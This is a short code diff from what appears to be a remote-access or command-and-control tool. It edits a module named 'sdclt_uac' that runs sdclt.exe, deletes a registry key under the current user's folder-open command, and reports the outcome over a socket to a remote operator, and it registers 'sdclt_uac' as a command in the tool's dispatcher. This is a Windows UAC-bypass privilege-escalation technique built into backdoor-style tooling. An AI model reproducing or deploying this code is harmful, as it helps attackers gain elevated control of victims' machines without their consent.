@@ -26,9 +26,9 @@ def sdclt_uac(data):
         startfile('C:\\WINDOWS\\system32\\sdclt.exe')
         sleep(2)
         winreg.DeleteKey(winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\Folder\\shell\open'), 'command')
-        s.sendall('[+]Attempted to get executable to bypass UAC through sdclt.exe'.encode())
+        main_send('[+]Attempted to get executable to bypass UAC through sdclt.exe', s)
     else:
-        s.sendall('[-]Executable remote filepath does not exist'.encode())
+        main_send('[-]Executable remote filepath does not exist', s)
 ''')
         config.logics.append('''
             elif command == "sdclt_uac":
